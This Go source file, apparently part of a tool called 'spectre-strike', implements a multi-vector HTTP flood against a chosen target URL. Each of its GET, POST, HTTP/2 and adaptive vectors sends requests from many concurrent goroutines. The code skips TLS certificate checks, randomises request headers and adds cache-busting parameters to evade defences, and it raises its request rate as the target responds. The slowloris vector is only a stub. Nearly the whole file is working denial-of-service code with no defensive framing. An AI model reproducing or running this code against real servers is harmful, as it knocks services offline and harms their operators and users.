package attacks

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"spectre-strike/pkg/utils"

	"github.com/fatih/color"
)

type HybridConfig struct {
	Target   string
	Duration time.Duration
	Vectors  []string
}

type hybridStats struct {
	totalRequests int64
	vectorStats   map[string]*vectorStat
	mutex         sync.RWMutex
}

type vectorStat struct {
	requests   int64
	successful int64
}

func LaunchHybrid(config HybridConfig) error {
	parsedURL, err := url.Parse(config.Target)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}

	stats := &hybridStats{
		vectorStats: make(map[string]*vectorStat),
	}

	for _, vector := range config.Vectors {
		stats.vectorStats[vector] = &vectorStat{}
	}

	done := make(chan bool)
	var wg sync.WaitGroup

	// Start statistics reporter
	go reportHybridStats(stats, config.Duration, config.Vectors)

	// Launch each attack vector
	for _, vector := range config.Vectors {
		wg.Add(1)
		go func(v string) {
			defer wg.Done()
			launchVector(v, parsedURL, stats, done)
		}(vector)
	}

	// Wait for duration
	time.Sleep(config.Duration)
	close(done)
	wg.Wait()

	return nil
}

func launchVector(vector string, parsedURL *url.URL, stats *hybridStats, done chan bool) {
	switch vector {
	case "slowloris":
		launchSlowlorisVector(parsedURL, stats, vector, done)
	case "http2":
		launchHTTP2Vector(parsedURL, stats, vector, done)
	case "adaptive":
		launchAdaptiveVector(parsedURL, stats, vector, done)
	case "post":
		launchPOSTVector(parsedURL, stats, vector, done)
	case "get":
		launchGETVector(parsedURL, stats, vector, done)
	default:
		color.Yellow("   ⚠️  Unknown vector: %s", vector)
	}
}

func launchSlowlorisVector(parsedURL *url.URL, stats *hybridStats, vector string, done chan bool) {
	for i := 0; i < 20; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
					// Simplified slowloris
					makeSlowRequest(parsedURL, stats, vector)
					time.Sleep(5 * time.Second)
				}
			}
		}()
	}
}

func launchHTTP2Vector(parsedURL *url.URL, stats *hybridStats, vector string, done chan bool) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				NextProtos:         []string{"h2", "http/1.1"},
			},
		},
	}

	for i := 0; i < 30; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
					makeHTTP2Request(client, parsedURL, stats, vector)
					time.Sleep(100 * time.Millisecond)
				}
			}
		}()
	}
}

func launchAdaptiveVector(parsedURL *url.URL, stats *hybridStats, vector string, done chan bool) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	rate := 10
	for i := 0; i < 20; i++ {
		go func() {
			ticker := time.NewTicker(time.Second)
			defer ticker.Stop()

			for {
				select {
				case <-done:
					return
				case <-ticker.C:
					for j := 0; j < rate; j++ {
						makeAdaptiveRequestHybrid(client, parsedURL, stats, vector)
					}
					// Simple adaptive logic
					if stats.vectorStats[vector].successful > stats.vectorStats[vector].requests/2 {
						rate++
						if rate > 50 {
							rate = 50
						}
					}
				}
			}
		}()
	}
}

func launchPOSTVector(parsedURL *url.URL, stats *hybridStats, vector string, done chan bool) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for i := 0; i < 25; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
					makePOSTRequest(client, parsedURL, stats, vector)
					time.Sleep(150 * time.Millisecond)
				}
			}
		}()
	}
}

func launchGETVector(parsedURL *url.URL, stats *hybridStats, vector string, done chan bool) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for i := 0; i < 40; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
					makeGETRequest(client, parsedURL, stats, vector)
					time.Sleep(100 * time.Millisecond)
				}
			}
		}()
	}
}

func makeSlowRequest(parsedURL *url.URL, stats *hybridStats, vector string) {
	incrementRequest(stats, vector)
	// Implementation simplified for hybrid mode
	incrementSuccess(stats, vector)
}

func makeHTTP2Request(client *http.Client, parsedURL *url.URL, stats *hybridStats, vector string) {
	incrementRequest(stats, vector)

	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		return
	}

	headers := utils.GenerateRandomHeaders(parsedURL.Host)
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err == nil {
		incrementSuccess(stats, vector)
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func makeAdaptiveRequestHybrid(client *http.Client, parsedURL *url.URL, stats *hybridStats, vector string) {
	incrementRequest(stats, vector)

	req, err := http.NewRequest("GET", parsedURL.String(), nil)
	if err != nil {
		return
	}

	headers := utils.GenerateRandomHeaders(parsedURL.Host)
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err == nil {
		incrementSuccess(stats, vector)
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func makePOSTRequest(client *http.Client, parsedURL *url.URL, stats *hybridStats, vector string) {
	incrementRequest(stats, vector)

	payload := strings.NewReader(`{"data":"` + utils.RandomString(100) + `"}`)
	req, err := http.NewRequest("POST", parsedURL.String(), payload)
	if err != nil {
		return
	}

	headers := utils.GenerateRandomHeaders(parsedURL.Host)
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err == nil {
		incrementSuccess(stats, vector)
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func makeGETRequest(client *http.Client, parsedURL *url.URL, stats *hybridStats, vector string) {
	incrementRequest(stats, vector)

	// Add cache-busting parameter
	targetURL := fmt.Sprintf("%s?cb=%s", parsedURL.String(), utils.RandomString(10))
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return
	}

	headers := utils.GenerateRandomHeaders(parsedURL.Host)
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err == nil {
		incrementSuccess(stats, vector)
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func incrementRequest(stats *hybridStats, vector string) {
	atomic.AddInt64(&stats.totalRequests, 1)
	stats.mutex.RLock()
	stat := stats.vectorStats[vector]
	stats.mutex.RUnlock()
	atomic.AddInt64(&stat.requests, 1)
}

func incrementSuccess(stats *hybridStats, vector string) {
	stats.mutex.RLock()
	stat := stats.vectorStats[vector]
	stats.mutex.RUnlock()
	atomic.AddInt64(&stat.successful, 1)
}

func reportHybridStats(stats *hybridStats, duration time.Duration, vectors []string) {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()
	lastTotal := int64(0)

	for range ticker.C {
		elapsed := time.Since(startTime)
		if elapsed >= duration {
			break
		}

		total := atomic.LoadInt64(&stats.totalRequests)
		rps := float64(total-lastTotal) / 3.0
		lastTotal = total

		remaining := duration - elapsed
		color.Cyan("\n   📊 Total RPS: %.0f | Total Requests: %d | Time: %s",
			rps, total, remaining.Round(time.Second))

		stats.mutex.RLock()
		for _, vector := range vectors {
			stat := stats.vectorStats[vector]
			reqs := atomic.LoadInt64(&stat.requests)
			succ := atomic.LoadInt64(&stat.successful)
			successRate := 0.0
			if reqs > 0 {
				successRate = float64(succ) / float64(reqs) * 100
			}
			color.Yellow("      ├─ %s: %d requests (%.1f%% success)", vector, reqs, successRate)
		}
		stats.mutex.RUnlock()
	}
}
